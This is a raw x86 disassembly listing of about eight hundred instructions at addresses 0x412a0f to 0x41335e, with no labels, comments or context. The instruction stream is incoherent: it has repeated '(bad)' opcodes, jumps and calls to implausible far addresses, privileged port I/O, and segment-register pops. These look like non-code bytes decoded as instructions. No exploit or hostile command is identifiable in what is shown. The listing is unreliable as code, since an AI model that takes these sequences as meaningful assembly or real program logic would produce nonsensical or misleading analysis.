  412a0f:	jmp    0xd9c72bb8
  412a14:	test   al,0x2
  412a16:	add    BYTE PTR [eax+0x16],ah
  412a19:	fild   WORD PTR [ebx]
  412a1b:	jmp    0x412a20
	...
  412a30:	add    BYTE PTR [ecx+eax*4+0x2a469fa],ah
  412a37:	add    dl,bl
  412a39:	lods   al,BYTE PTR ds:[esi]
  412a3a:	jg     0x412aa7
  412a3c:	or     eax,0xb58b00ab
  412a41:	enter  0x5212,0x72
  412a45:	and    sp,WORD PTR [ebx+0x40]
  412a49:	ja     0x412a77
  412a4b:	pop    esi
  412a4c:	xchg   edi,eax
  412a4d:	jmp    0xa522ec19
  412a52:	cmp    edx,0x2a1e9
  412a58:	fwait
  412a59:	test   al,0xdb
  412a5b:	inc    ebx
  412a5c:	int    0xac
  412a5e:	cmp    edx,0xffffffe9
  412a61:	inc    ecx
  412a62:	sub    bh,dh
  412a64:	jnp    0x412a93
  412a66:	fild   DWORD PTR [ebx-0x3b]
  412a69:	lods   al,BYTE PTR ds:[esi]
  412a6a:	jge    0x412abf
  412a6c:	int    0xac
  412a6e:	aam    0x8a
  412a70:	pop    ds
  412a71:	mov    edx,gs
  412a73:	clc    
  412a74:	out    0xb8,al
  412a76:	enter  0x3c5d,0x6c
  412a7a:	inc    esp
  412a7b:	pop    es
  412a7c:	jmp    0xe55c9324
  412a81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412a82:	add    dh,BYTE PTR [ebp+0x0]
  412a85:	inc    edi
  412a86:	lods   eax,DWORD PTR ds:[esi]
  412a87:	test   BYTE PTR [eax],dl
  412a89:	dec    edx
  412a8a:	push   es
  412a8b:	add    BYTE PTR [ecx+0x3f6c8],cl
  412a91:	ds inc esi
  412a93:	xchg   DWORD PTR [esi+0x0],ebp
	...
  412aa9:	add    BYTE PTR [edx-0x68000006],ah
  412aaf:	or     BYTE PTR [esi],0x4
  412ab2:	push   cs
  412ab3:	push   es
  412ab4:	mov    eax,DWORD PTR [esi+0x216]
  412aba:	cs pop ds
  412abc:	(bad)  
  412abd:	mov    ebp,0x1e2
  412ac2:	sti    
  412ac3:	test   BYTE PTR [edx+0x1ce86],0x0
  412aca:	ja     0x412a4c
  412acc:	push   ss
  412acd:	add    al,0xce
  412acf:	add    eax,0x13208940
  412ad4:	add    al,0x0
  412ad6:	mov    esi,0xba1084a6
  412adb:	add    eax,0xf6488b00
  412ae0:	add    eax,DWORD PTR [eax]
  412ae2:	into   
  412ae3:	aad    0x1e
  412ae5:	mov    ebx,DWORD PTR [edx]
  412ae7:	and    dl,BYTE PTR [esi]
  412ae9:	push   edx
  412aea:	xor    eax,0xc6d4e6e8
  412aef:	fscale 
  412af1:	pop    edi
  412af2:	push   eax
  412af3:	push   edx
  412af4:	pop    ecx
  412af5:	ret    0x586
  412af8:	mov    eax,DWORD PTR [edx+ebx*2+0x1]
  412afc:	lea    edx,[eax-0x7272]
  412b02:	xor    eax,0x7e04028e
  412b07:	add    eax,0xa6f51976
  412b0c:	or     al,BYTE PTR [eax+eax*1]
	...
  412b23:	dec    esi
  412b24:	add    eax,0xc9a7c13b
  412b29:	or     BYTE PTR [ebx],ch
  412b2b:	pop    bp
  412b2d:	push   es
  412b2e:	add    BYTE PTR [edx+ebx*2+0x7],bh
  412b32:	add    bh,cl
  412b34:	sbb    al,BYTE PTR [edx]
  412b36:	ret    0x1ba3
  412b39:	icebp  
  412b3a:	mov    edi,0x83021f65
  412b3f:	cmp    ebp,DWORD PTR [ebx]
  412b41:	rcl    DWORD PTR [esp+ebp*1-0x9],1
  412b45:	out    0x1f,eax
  412b47:	jno    0x412b95
  412b49:	dec    ecx
  412b4a:	mov    dl,BYTE PTR [esi]
  412b4c:	lock jl 0x412baa
  412b4f:	ret    
  412b50:	dec    ebx
  412b51:	jnp    0x412bae
  412b53:	retf   
  412b54:	and    ebp,ebx
  412b56:	lods   eax,DWORD PTR ds:[esi]
  412b57:	scas   eax,DWORD PTR es:[edi]
  412b58:	pop    ss
  412b59:	add    al,BYTE PTR [eax]
  412b5b:	mov    al,ds:0xe8ff619c
  412b60:	sbb    bl,BYTE PTR [ecx]
  412b62:	or     dh,BYTE PTR [edx]
  412b64:	jg     0x412b4c
  412b66:	(bad)  
  412b67:	fcomp  DWORD PTR [edx]
  412b69:	add    cl,BYTE PTR [ebp-0x74fc00b5]
  412b6f:	and    DWORD PTR [edi],edx
  412b71:	push   es
  412b72:	add    BYTE PTR [edi+0x40ff7a96],ah
  412b78:	sbb    al,BYTE PTR [edx]
  412b7a:	cmp    ebx,edi
  412b7c:	jo     0x412b93
  412b7e:	mov    ebx,DWORD PTR [ecx]
  412b80:	das    
  412b81:	push   es
  412b82:	add    BYTE PTR [edi+0x754324],ah
	...
  412b9c:	mov    ds:0x9cea4344,eax
  412ba1:	inc    esp
  412ba2:	inc    ebx
  412ba3:	add    al,0xa7
  412ba5:	xchg   ecx,eax
  412ba6:	add    eax,DWORD PTR [eax]
  412ba8:	mov    WORD PTR [ecx+esi*8],ds
  412bab:	mov    edi,0x3faa02c
  412bb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bb1:	sbb    ebp,edi
  412bb3:	mov    ch,0x96
  412bb5:	add    dh,dh
  412bb7:	jne    0x412ba8
  412bb9:	add    DWORD PTR [edx-0x28],esi
  412bbc:	xor    bh,bh
  412bbe:	popa   
  412bbf:	add    BYTE PTR ds:0x9c7b0e7c,bl
  412bc5:	jg     0x412c38
  412bc7:	xchg   BYTE PTR [eax-0x57fc1702],ch
  412bcd:	jo     0x412ba7
  412bcf:	cld    
  412bd0:	cli    
  412bd1:	ret    0x78e7
  412bd4:	fcom   QWORD PTR [eax-0xc58714]
  412bda:	in     al,0x3
  412bdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bdd:	jns    0x412bdb
  412bdf:	or     BYTE PTR [edi+0x2],0xe9
  412be3:	add    esp,DWORD PTR [edi-0x54f788ff]
  412be9:	add    ch,cl
  412beb:	add    ch,BYTE PTR [ecx]
  412bed:	sti    
  412bee:	in     al,dx
  412bef:	add    esp,DWORD PTR [edi-0x5cf79985]
  412bf5:	add    ch,cl
  412bf7:	js     0x412be1
  412bf9:	fld    TBYTE PTR [esi+0x0]
  412bfc:	mov    ds:0x82e902,eax
	...
  412c15:	iret   
  412c16:	add    al,cl
  412c18:	add    ah,BYTE PTR [edi+0x2fbbedb0]
  412c1e:	sub    esp,0xf002a707
  412c24:	pop    ebp
  412c25:	test   al,0xfe
  412c27:	call   0x92c5c42f
  412c2c:	sub    al,0xa1
  412c2e:	daa    
  412c2f:	jno    0x412bf9
  412c31:	(bad)  
  412c32:	repnz push edx
  412c34:	add    al,0x8
  412c36:	add    ch,cl
  412c38:	call   0x7b2fdca3
  412c3d:	aam    0xde
  412c3f:	mov    eax,0xff83af18
  412c44:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c46:	test   DWORD PTR [ebp+0x2a423],0xffbedaf6
  412c50:	in     eax,dx
  412c51:	shl    BYTE PTR [esi+0x7d686200],cl
  412c57:	add    esp,DWORD PTR [edx+0x38]
  412c5a:	jg     0x412c96
  412c5c:	ret    0x8343
  412c5f:	mov    dl,0xe8
  412c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c62:	add    cl,BYTE PTR [ebx+0x34467]
  412c68:	jmp    0xae503016
  412c6d:	call   0x1d2a4854
  412c72:	daa    
  412c73:	(bad)  
  412c74:	shr    BYTE PTR [ecx-0x4f],cl
  412c77:	cmp    DWORD PTR [edx+0x0],esp
	...
  412c8e:	mov    ebx,0xf8fdfaec
  412c93:	jne    0x412c1b
  412c95:	jmp    0xb2412eb6
  412c9a:	sub    al,BYTE PTR [ebx]
  412c9c:	add    al,0xe9
  412c9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c9f:	mov    al,0x17
  412ca1:	jb     0x412ccd
  412ca3:	sti    
  412ca4:	add    ebp,ecx
  412ca6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ca7:	jmp    0x412ca0
  412ca9:	fild   QWORD PTR [eax-0x37bd0825]
  412caf:	fcomi  st,st(7)
  412cb1:	push   0xe866276b
  412cb6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cb7:	sbb    eax,DWORD PTR [ecx]
  412cb9:	cli    
  412cba:	cmp    DWORD PTR [ebp+eax*1+0x62],0xffffffb8
  412cbf:	outs   dx,BYTE PTR ds:[esi]
  412cc0:	mov    ebp,gs
  412cc2:	mov    ds:0xdc9ac4e9,eax
  412cc7:	jmp    0x6003:0xb070cd53
  412cce:	jo     0x412cb2
  412cd0:	sub    eax,DWORD PTR [eax]
  412cd2:	fisttp DWORD PTR gs:0x11c84
  412cd9:	add    BYTE PTR [ebx],cl
  412cdb:	jnp    0x412cdb
  412cdd:	(bad)  
  412cde:	jle    0x412ce2
  412ce0:	mov    ecx,ebp
  412ce2:	mov    ch,0xe6
  412ce4:	xchg   DWORD PTR [edx+eiz*4+0x12],ecx
  412ce8:	cmp    ecx,DWORD PTR [edx+eiz*4+0x4a]
  412cec:	or     eax,0xffffb487
  412cf1:	inc    DWORD PTR [eax]
	...
  412d07:	mov    ch,0x6a
  412d09:	and    dl,BYTE PTR [eax]
  412d0b:	mov    ah,0x12
  412d0d:	add    DWORD PTR [edx],edi
  412d0f:	xchg   edx,eax
  412d10:	sub    edi,esi
  412d12:	mov    cl,BYTE PTR [edx+0xcbb1222]
  412d18:	add    al,BYTE PTR [eax]
  412d1a:	add    BYTE PTR [edx-0x1d71c6d6],dh
  412d20:	and    eax,0x82e9fffe
  412d25:	enter  0xe00,0x2
  412d29:	mov    edx,DWORD PTR [edx+eiz*8+0x31]
  412d2d:	cmp    edx,ebx
  412d2f:	in     eax,dx
  412d30:	push   ds
  412d31:	mov    ecx,DWORD PTR [ebp-0x4]
  412d34:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d35:	out    0x2b,al
  412d37:	cli    
  412d38:	inc    ebp
  412d39:	mov    al,BYTE PTR es:[edx]
  412d3c:	sub    edi,esi
  412d3e:	cmp    DWORD PTR [edi-0xbcfb8e],edi
  412d44:	adc    al,0xd8
  412d46:	jb     0x412dc4
  412d48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d49:	dec    edx
  412d4a:	and    al,0xd2
  412d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d4d:	push   0x24
  412d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d50:	adc    eax,0xdf420fd8
  412d55:	(bad)  
  412d56:	dec    DWORD PTR [esi-0x61dba5ec]
  412d5c:	jae    0x412da3
  412d5e:	push   ebx
  412d5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d60:	push   0x7d
  412d62:	int    0x7f
  412d64:	leave  
  412d65:	sub    eax,0xb7b080fe
  412d6a:	and    eax,DWORD PTR [eax]
	...
  412d80:	xchg   edi,eax
  412d81:	mov    al,0xcf
  412d83:	and    ecx,DWORD PTR [edi+0x598ad48a]
  412d89:	mov    al,ds:0x2140e71b
  412d8e:	sub    esi,edi
  412d90:	mov    WORD PTR [ebx+0x7d],ss
  412d93:	dec    ebx
  412d94:	mov    esp,DWORD PTR [edi]
  412d96:	add    eax,0x18040fed
  412d9b:	ret    
  412d9c:	icebp  
  412d9d:	fs pop ss
  412d9f:	mov    cl,bl
  412da1:	(bad)  
  412da2:	fcmovnb st,st(0)
  412da4:	sub    eax,0x66c17d19
  412da9:	inc    ebx
  412daa:	or     DWORD PTR [ebx],eax
  412dac:	in     eax,0x17
  412dae:	mov    esi,0x4a20b723
  412db3:	jne    0x412d5e
  412db5:	mov    ds:0x80af23b6,al
  412dba:	mov    esp,0xfe37313a
  412dbf:	(bad)  
  412dc0:	clc    
  412dc1:	sub    eax,0xa05652c0
  412dc6:	cmp    bh,ah
  412dc8:	test   BYTE PTR [ecx+0x672cfe29],dh
  412dce:	fimul  WORD PTR [edi]
  412dd0:	sub    al,0xd3
  412dd2:	jge    0x412e17
  412dd4:	mov    esi,DWORD PTR [ebx]
  412dd6:	aam    0x4f
  412dd8:	sbb    al,0x5
  412dda:	sbb    ecx,DWORD PTR [edi-0x43]
  412ddd:	mov    ebx,0xfef8a29
  412de2:	cmp    DWORD PTR [edx+0x0],ecx
	...
  412df8:	add    BYTE PTR [ebx-0x9],al
  412dfb:	(bad)  [edi+0x295c80fc]
  412e01:	cwde   
  412e02:	add    edx,DWORD PTR [eax]
  412e04:	jle    0x412e74
  412e06:	inc    edx
  412e07:	(bad)  
  412e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e0a:	cmp    cl,ch
  412e0c:	ds int 0xb6
  412e0f:	les    edx,FWORD PTR [ebx]
  412e11:	cmc    
  412e12:	div    BYTE PTR [ecx-0x31]
  412e15:	les    ecx,FWORD PTR [esi]
  412e17:	jo     0x412de8
  412e19:	les    ecx,FWORD PTR [edx]
  412e1b:	pusha  
  412e1c:	mov    esp,0x60825c12
  412e22:	pushf  
  412e23:	out    0x3,eax
  412e25:	pushf  
  412e26:	jl     0x412e0c
  412e28:	call   DWORD PTR [eax+0x24]
  412e2b:	pop    esi
  412e2c:	or     al,0x1c
  412e2e:	jge    0x412e0c
  412e30:	inc    DWORD PTR [eax+0x24]
  412e33:	add    DWORD PTR [edx+esi*4],ebp
  412e36:	(bad)  
  412e37:	adc    DWORD PTR [edi*1+0x272c01f7],ebp
  412e3e:	cmp    al,0xe8
  412e40:	fwait
  412e41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e42:	add    dl,BYTE PTR [edx+0x7123d406]
  412e48:	cli    
  412e49:	sbb    eax,0x227d4fe7
  412e4e:	jecxz  0x412e34
  412e50:	add    esp,DWORD PTR [edi-0x737a5201]
  412e56:	(bad)  
  412e58:	add    bh,BYTE PTR [ebx+0x10]
  412e5b:	ins    BYTE PTR es:[edi],dx
  412e5c:	sub    DWORD PTR [eax],eax
	...
  412e72:	cdq    
  412e73:	jge    0x412ea3
  412e75:	sub    ah,cl
  412e77:	and    edx,DWORD PTR [ecx-0x4]
  412e7a:	das    
  412e7b:	mov    bh,0x4
  412e7d:	or     al,0x1e
  412e7f:	(bad)  
  412e80:	or     al,0x14
  412e82:	sbb    al,0xbf
  412e84:	add    al,0xe0
  412e86:	sub    eax,0x2c140ccf
  412e8b:	mov    bh,0x4
  412e8d:	or     al,0x50
  412e8f:	(bad)  
  412e90:	call   DWORD PTR [ebx+0x6003b32d]
  412e96:	mov    ds:0xb32d82c8,eax
  412e9b:	inc    eax
  412e9c:	psubsw mm5,QWORD PTR [ebx]
  412e9f:	pop    ss
  412ea0:	aaa    
  412ea1:	push   0x3f
  412ea3:	fild   WORD PTR [ebx-0x17]
  412ea6:	push   esi
  412ea7:	js     0x412e99
  412ea9:	jl     0x412f28
  412eab:	lock mov edi,0x373f2b9f
  412eb1:	sub    ebx,DWORD PTR [ebx-0x7f5a74fe]
  412eb7:	jecxz  0x412e3d
  412eb9:	test   eax,0xb182f909
  412ebe:	jg     0x412e85
  412ec0:	sub    BYTE PTR [ebp-0x16e8bec4],0xc3
  412ec7:	mov    bh,0x23
  412ec9:	sub    eax,0xcf733ab8
  412ece:	mov    bl,0xcf
  412ed0:	and    esp,DWORD PTR ds:0xc77351a8
	...
  412eea:	add    BYTE PTR [ebp-0x5b12ec83],bl
  412ef0:	add    cl,BYTE PTR [eax+0x70]
  412ef3:	add    eax,DWORD PTR es:[ecx+ebp*8]
  412ef7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ef8:	jns    0x412e87
  412efa:	stc    
  412efb:	add    BYTE PTR [ebx],ah
  412efd:	inc    BYTE PTR [ecx-0x62]
  412f00:	sub    ch,ch
  412f02:	push   edx
  412f03:	sti    
  412f04:	cmp    DWORD PTR [esi-0x1a],edx
  412f07:	jbe    0x412f73
  412f09:	(bad)  
  412f0a:	fsub   st,st(5)
  412f0c:	and    cl,bh
  412f0e:	sub    ebx,edx
  412f10:	cmp    ecx,DWORD PTR [esi]
  412f12:	xchg   edi,eax
  412f13:	cmp    eax,0xa4a81002
  412f18:	push   ecx
  412f19:	mov    edi,0xb5f4661a
  412f1e:	add    BYTE PTR [edi],ah
  412f20:	std    
  412f21:	cmovno edi,DWORD PTR [esi+0x7933becf]
  412f28:	sub    dh,BYTE PTR [ecx+edi*4+0x40f68d]
  412f2f:	ffreep st(5)
  412f31:	add    ecx,0x81c5178a
  412f37:	mov    bh,0x5
  412f39:	add    DWORD PTR [eax],eax
  412f3b:	mov    ds,WORD PTR [eax-0x39]
  412f3e:	test   esi,ecx
  412f40:	sbb    al,BYTE PTR [ebx+0x677bb]
  412f46:	push   ebx
  412f47:	pop    es
  412f48:	hlt    
  412f49:	mov    WORD PTR [esi+0x4a],cs
  412f4c:	test   eax,eax
  412f4e:	sbb    BYTE PTR [eax],al
	...
  412f64:	cs add al,0x0
  412f67:	mov    edi,0x73e
  412f6c:	ret    
  412f6d:	dec    esi
  412f6e:	call   DWORD PTR [edi+eax*8-0x9]
  412f72:	xor    al,al
  412f74:	dec    ebx
  412f75:	push   es
  412f76:	add    BYTE PTR [eax],al
  412f78:	ds popf 
  412f7a:	daa    
  412f7b:	(bad)  
  412f7c:	jp     0x412f81
  412f7e:	add    BYTE PTR [eax],al
  412f80:	push   cs
  412f81:	push   es
  412f82:	add    BYTE PTR [ebx+0x3d034e],al
  412f88:	or     al,BYTE PTR [esi]
  412f8a:	add    BYTE PTR [edx+0x22],dh
  412f8d:	mov    al,al
  412f8f:	add    BYTE PTR [edx],cl
  412f91:	push   es
  412f92:	add    BYTE PTR [ebx-0x4d4fcb1],al
  412f98:	sti    
  412f99:	iret   
  412f9a:	mov    DWORD PTR [esi-0x1de36],ecx
  412fa0:	inc    ebp
  412fa1:	adc    BYTE PTR [ebx-0x7b60be38],al
  412fa7:	and    al,0xca
  412fa9:	add    eax,0xa9a78900
  412fae:	sti    
  412faf:	add    esp,DWORD PTR [edi-0x5c6284d5]
  412fb5:	das    
  412fb6:	add    al,BYTE PTR [eax]
  412fb8:	push   ds
  412fb9:	mov    ds:0x2ba703f7,al
  412fbe:	jnp    0x412ff9
  412fc0:	sub    al,0xc1
  412fc2:	(bad)  
  412fc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fc5:	sub    edi,DWORD PTR [ecx-0x6b]
	...
  412fdc:	add    BYTE PTR [edi+0x1e000227],dh
  412fe2:	mov    ecx,0x2ba703db
  412fe7:	js     0x412ff1
  412fe9:	outs   dx,DWORD PTR cs:[esi]
  412feb:	ficomp WORD PTR [ebx]
  412fed:	sbb    al,0x67
  412fef:	ficom  WORD PTR [ebx+0x1f]
  412ff2:	and    eax,0x27bb9e03
  412ff7:	add    al,BYTE PTR [eax]
  412ff9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ffa:	mov    DWORD PTR [edx],edx
  412ffc:	add    al,0xa7
  412ffe:	sub    edi,DWORD PTR [edx+0x140fcb88]
  413004:	mov    ebx,eax
  413006:	pop    es
  413007:	or     al,0x89
  413009:	sbb    DWORD PTR [edi],esp
  41300b:	(bad)  
  41300c:	push   DWORD PTR [eax]
  41300e:	xchg   edx,eax
  41300f:	(bad)  
  413010:	and    ecx,edi
  413012:	adc    al,0x41
  413014:	push   cs
  413015:	sub    DWORD PTR [ebp+edi*8-0x1],ebx
  413019:	sbb    BYTE PTR [esi+0x2b10ff89],dl
  41301f:	add    cl,BYTE PTR [ebx-0x7b39b09d]
  413025:	out    0xf6,eax
  413027:	jmp    0xa909bb6
  41302c:	inc    ecx
  41302d:	push   ds
  41302e:	out    dx,eax
  41302f:	fist   WORD PTR [edi]
  413031:	and    esp,DWORD PTR [edx-0x51]
  413034:	sub    al,0x2c
  413036:	neg    edi
  413038:	pop    edi
  413039:	sub    al,0x2
  41303b:	ja     0x413050
  41303d:	stos   DWORD PTR es:[edi],eax
  41303e:	add    ch,cl
  413040:	fiadd  DWORD PTR [eax]
	...
  413056:	pop    esp
  413057:	out    0xb8,al
  413059:	shr    DWORD PTR ds:0xb8fff478,1
  41305f:	and    BYTE PTR [ecx],dl
  413061:	rol    BYTE PTR [edx+esi*4-0x19a38569],1
  413068:	xchg   esp,eax
  413069:	shl    edi,1
  41306b:	pop    ds
  41306c:	sbb    BYTE PTR [edx+0x436bf364],al
  413072:	mov    eax,ds:0x88fe9386
  413077:	and    cl,dl
  413079:	mov    esp,0x2c1193fe
  41307f:	scas   eax,DWORD PTR es:[edi]
  413080:	int3   
  413081:	mov    edi,0xc3c4b71d
  413086:	pop    ds
  413087:	scas   eax,DWORD PTR es:[edi]
  413088:	int3   
  413089:	xlat   BYTE PTR ds:[ebx]
  41308a:	das    
  41308b:	mov    bh,0xc4
  41308d:	fisttp DWORD PTR [ebp+0x0]
  413090:	jb     0x413052
  413092:	test   BYTE PTR [esi+0x6b47671],dh
  413098:	jmp    0x3884bca0
  41309d:	rcl    edi,1
  41309f:	lea    ebx,[eax+eiz*8]
  4130a2:	je     0x413058
  4130a4:	jno    0x4130dc
  4130a6:	inc    eax
  4130a7:	test   BYTE PTR [ecx+0x3c8c2125],dh
  4130ad:	loopne 0x41307b
  4130af:	and    DWORD PTR [ebx+0x468ea002],0xffffffff
  4130b6:	or     BYTE PTR [eax],ah
  4130b8:	popa   
  4130b9:	jle    0x4130bb
	...
  4130cf:	les    eax,FWORD PTR [esi]
  4130d1:	jmp    0xcd0810d9
  4130d6:	xstore-rng (bad)
  4130d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130d8:	add    ch,cl
  4130da:	add    ebp,DWORD PTR [esi-0x333003a]
  4130e0:	xchg   esi,eax
  4130e1:	popa   
  4130e2:	push   0xffffff82
  4130e4:	add    cl,BYTE PTR [edi]
  4130e6:	outs   dx,DWORD PTR ds:[esi]
  4130e7:	cmc    
  4130e8:	add    al,0x0
  4130ea:	jmp    0x1164f4ac
  4130ef:	mov    edx,0xa4ea4783
  4130f4:	add    cl,BYTE PTR [ebx+0x570fd0ad]
  4130fa:	adc    ah,BYTE PTR [edx-0x4c]
  4130fd:	dec    edi
  4130fe:	(bad)  
  4130ff:	fldenv [edi]
  413101:	loope  0x413138
  413103:	ret    0x8a20
  413106:	mov    ch,0x70
  413108:	xlat   BYTE PTR ds:[ebx]
  413109:	push   esi
  41310a:	mov    eax,0x318a4e0f
  41310f:	mov    ds:0xc20ef653,eax
  413114:	fadd   st(2),st
  413116:	idiv   cl
  413118:	inc    BYTE PTR [edx]
  41311a:	jmp    0xcd84bcc3
  41311f:	dec    esp
  413120:	fdivp  st(7),st
  413122:	jecxz  0x4130c8
  413124:	add    bh,BYTE PTR [eax+esi*8+0x27]
  413128:	and    BYTE PTR [ecx],al
  41312a:	out    dx,al
  41312b:	enter  0x30a,0xe9
  41312f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413130:	(bad)  
  413132:	dec    ebx
	...
  413147:	add    BYTE PTR [ebx+0x27f07c02],ah
  41314d:	and    BYTE PTR [edx],al
  41314f:	out    dx,al
  413150:	test   al,0x1a
  413152:	add    ecx,ebp
  413154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413155:	mov    ebx,DWORD PTR [ebx+0x5]
  413158:	jmp    0x4130e5
  41315a:	inc    ebx
  41315b:	int    0xe0
  41315d:	mov    edx,DWORD PTR [ebp-0x1e0f70b]
  413163:	ret    0x8a67
  413166:	inc    ebx
  413167:	lds    eax,FWORD PTR [edi+eax*8]
  41316a:	dec    edi
  41316b:	add    BYTE PTR [ebx+0x5a],bh
  41316e:	call   DWORD PTR [eax-0x44]
  413171:	xor    al,0x8b
  413173:	inc    esp
  413174:	repnz push esi
  413176:	dec    esi
  413177:	mov    edi,DWORD PTR [eax]
  413179:	sti    
  41317a:	(bad)  
  41317c:	dec    ecx
  41317d:	out    0x89,al
  41317f:	dec    esp
  413180:	mov    ds:0xb24c373e,al
  413185:	inc    esi
  413186:	mov    eax,DWORD PTR [ebx-0x31]
  413189:	fwait
  41318a:	inc    edx
  41318b:	and    al,0xca
  41318d:	dec    edi
  41318e:	jp     0x4131c9
  413190:	xor    eax,0xc88b50b4
  413195:	stc    
  413196:	inc    edx
  413197:	test   ecx,0x624c89e6
  41319d:	inc    edx
  41319e:	xchg   DWORD PTR [edx+eiz*2+0x3e],eax
  4131a2:	mov    DWORD PTR [edx+esi*2+0x5e],eax
  4131a6:	dec    esi
  4131a7:	push   ecx
  4131a8:	add    eax,0x2fe6d8
	...
  4131c1:	jno    0x4131a5
  4131c3:	std    
  4131c4:	mov    edi,DWORD PTR [edx]
  4131c6:	and    ch,BYTE PTR ds:[ebx]
  4131c9:	xchg   BYTE PTR [edx],al
  4131cb:	leave  
  4131cc:	mov    eax,0x38e19817
  4131d1:	jno    0x4131c3
  4131d3:	iret   
  4131d4:	cli    
  4131d5:	aad    0xc4
  4131d7:	mov    edi,0xc20539e8
  4131dc:	jmp    0x41317c
  4131de:	lea    ecx,[edx+0x24]
  4131e1:	call   0xf710:0x56ce8957
  4131e8:	call   FWORD PTR [ecx-0x72]
  4131eb:	push   edx
  4131ec:	and    al,0xc2
  4131ee:	(bad)  
  4131ef:	(bad)  
  4131f0:	mov    eax,edx
  4131f2:	sub    bh,BYTE PTR [esi]
  4131f4:	push   edx
  4131f5:	into   
  4131f6:	(bad)  
  4131f7:	int3   
  4131f8:	call   0xfe5aafa4
  4131fd:	clc    
  4131fe:	inc    eax
  4131ff:	cmp    cl,BYTE PTR [edx+0x23bf90e4]
  413205:	dec    edi
  413206:	mov    ds:0x28a4e186,al
  41320b:	inc    esp
  41320c:	rcr    bh,0x29
  41320f:	add    eax,0xdd6f8b44
  413214:	out    0x4a,eax
  413216:	adc    ecx,DWORD PTR [ecx+0x43]
  413219:	mov    ebx,DWORD PTR [edi]
  41321b:	add    eax,DWORD PTR [eax]
  41321d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41321e:	sub    eax,DWORD PTR [edi-0x22fcc602]
  413224:	imul   eax,DWORD PTR [eax],0x0
	...
  413237:	add    BYTE PTR [eax],al
  413239:	add    BYTE PTR [ebx+0x2c2f9e67],al
  41323f:	addr16 out 0x27,al
  413242:	bnd jp 0x4131d2
  413245:	int    0x7f
  413247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413248:	sbb    esi,edi
  41324a:	mov    BYTE PTR [eax-0x5f14dc49],dl
  413250:	cmp    ecx,DWORD PTR [edx+0x51c247e3]
  413256:	xlat   BYTE PTR ds:[ebx]
  413257:	nop
  413258:	push   ecx
  413259:	out    0x3c,eax
  41325b:	adc    eax,0xe89cfe21
  413260:	mov    ds,WORD PTR [ebx-0x7d]
  413263:	jae    0x413204
  413265:	pop    es
  413266:	push   0xa613e7ef
  41326b:	sub    eax,DWORD PTR [edx]
  41326d:	add    BYTE PTR [edx],ch
  41326f:	xor    al,0x97
  413271:	dec    esp
  413272:	jle    0x413253
  413274:	out    0x43,eax
  413276:	mov    dl,0xec
  413278:	mov    cs,WORD PTR [ebp+0x22793]
  41327e:	lea    ebp,[edx]
  413280:	mov    ch,0x50
  413282:	sub    al,0x7d
  413284:	sub    bl,BYTE PTR [esi+0x22a60214]
  41328a:	sbb    eax,0x2dc7c4b6
  41328f:	cmp    ah,BYTE PTR [ecx-0x39]
  413292:	(bad)
  413296:	sbb    eax,0xf2b0904c
  41329b:	sbb    al,0x7d
  41329d:	mov    es,WORD PTR [eax]
	...
  4132b3:	ins    BYTE PTR es:[edi],dx
  4132b4:	out    0xc0,al
  4132b6:	mov    eax,0x909e8977
  4132bb:	ins    BYTE PTR es:[edi],dx
  4132bc:	cli    
  4132bd:	out    0x2b,eax
  4132bf:	ins    BYTE PTR es:[edi],dx
  4132c0:	adc    al,0x5d
  4132c2:	and    bh,BYTE PTR [ebp+0x3a]
  4132c5:	popa   
  4132c6:	mov    edi,0xdceba84
  4132cb:	call   0xa9393f95
  4132d0:	sbb    al,0xe8
  4132d2:	add    ecx,DWORD PTR [eax+ecx*1-0x93b6096]
  4132d9:	call   0xe98e5cf0
  4132de:	add    esp,DWORD PTR [edi-0x4ffae481]
  4132e4:	mov    WORD PTR [ecx+0x4],es
  4132e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132e8:	add    ah,BYTE PTR [edx-0x49]
  4132eb:	(bad)
  4132ef:	xchg   esp,eax
  4132f0:	push   es
  4132f1:	jmp    0xf68256f9
  4132f6:	mov    ah,0x25
  4132f8:	inc    eax
  4132f9:	jmp    0x1bb3:0xea4325b6
  413300:	iret   
  413301:	add    al,0xe0
  413303:	xlat   BYTE PTR ds:[ebx]
  413304:	xchg   DWORD PTR [esi-0x32e5d7d4],esp
  41330a:	and    DWORD PTR ds:0x6dd40cc7,ebx
  413310:	mov    BYTE PTR [esp+ebp*8],0x2d
  413314:	mov    bh,0xff
  413316:	or     al,0x0
	...
  41332c:	push   DWORD PTR [ecx-0x67a46076]
  413332:	and    dl,BYTE PTR [ecx-0x6101e958]
  413338:	xor    dh,BYTE PTR [edx+ecx*4]
  41333b:	sub    eax,0x3954e40f
  413340:	and    cl,BYTE PTR [esi-0x19]
  413343:	xchg   edi,eax
  413344:	nop
  413345:	sbb    al,0xfe
  413347:	shr    BYTE PTR [ebx+0x7a],cl
  41334a:	or     BYTE PTR [ebx+0x62c1ffa2],0x63
  413351:	inc    edx
  413352:	clc    
  413353:	jmp    0x4133d0
  413355:	jmp    0x1cd97741
  41335a:	(bad)  
  41335b:	bound  edi,QWORD PTR [ebx-0x78]
  41335e:	inc    ebx
